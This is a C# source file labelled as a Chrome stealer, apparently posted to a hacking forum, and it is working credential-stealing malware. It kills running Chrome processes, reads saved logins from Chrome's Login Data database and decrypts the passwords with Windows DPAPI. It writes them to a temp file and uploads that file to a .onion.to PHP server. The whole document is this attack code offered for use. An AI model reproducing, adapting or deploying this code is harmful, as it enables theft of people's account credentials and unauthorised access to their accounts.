//Simple Non-SSL Chrome Stealer by Tigatron @ HF

using System.Security.Cryptography;
using System;
using System.Collections.Generic;
using System.Text;
using System.IO.Compression;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Data.SQLite;

namespace PwdExtract {
    internal class Program {


   
        private static void Main(string[] args) {
           
               
                //Kill Chrome
                Process[] chromeInstances = Process.GetProcessesByName("chrome");
             foreach (Process p in chromeInstances)
                p.Kill();
             //Read chrome DB in context of current user security
                var googledata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data\Default\Login Data";
            var sqliteConn = new SQLiteConnection("Data Source=" + googledata + ";Version=3;New=True;Compress=True;");
            var sqliteCom = sqliteConn.CreateCommand();

            sqliteCom.CommandText = "select Origin_URL, Username_value, Password_value from logins";
            sqliteConn.Open();
            var sqliteDatareader = sqliteCom.ExecuteReader();
            //write out DB contents to temporary file
            string UUID = Guid.NewGuid().ToString();
            string temp = Path.GetTempPath();
            StreamWriter writer = new StreamWriter(temp + UUID);
            Console.SetOut(writer);
            while (sqliteDatareader.Read()) {
               string url = (string)sqliteDatareader["Origin_URL"];
                string username = (string)sqliteDatareader["Username_value"];
                byte[] password = (byte[])sqliteDatareader["Password_value"];
                byte[] decryptedpw = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
                if (decryptedpw.Length > 0)
                {
                    Console.WriteLine("{0} :: {1}:{2}", url, username, Encoding.Default.GetString(decryptedpw));
                
                }
 }
            writer.Dispose();
            //Upload file to php server
            System.Net.WebClient Client = new System.Net.WebClient ();
    Client.Headers.Add("Content-Type","binary/octet-stream");
            //ENTER SERVER URL HERE
    byte[] result = Client.UploadFile("https://gpr7is4wqzy4qayh.onion.to/ul.php", "POST", temp + UUID);
            ////////////////////////////////
    String s = System.Text.Encoding .UTF8 .GetString (result,0,result.Length );
 sqliteConn.Close();

         
        }
        
        
            }
        }
    

